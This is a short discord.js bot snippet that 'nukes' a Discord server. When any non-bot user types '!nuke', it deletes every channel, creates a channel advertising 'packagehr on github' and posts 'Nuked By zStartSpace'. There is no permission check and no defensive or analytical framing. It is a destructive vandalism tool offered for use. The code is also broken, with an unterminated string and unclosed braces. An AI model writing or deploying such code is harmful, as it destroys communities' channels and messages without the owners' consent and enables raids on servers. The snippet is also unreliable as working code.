client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === '!nuke'){
      message.delete()
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.channels.create(`packagehr on github`, {
        type: 'text'
      }).then(channel => {
        channel.send("Nuked By zStartSpace)
      })
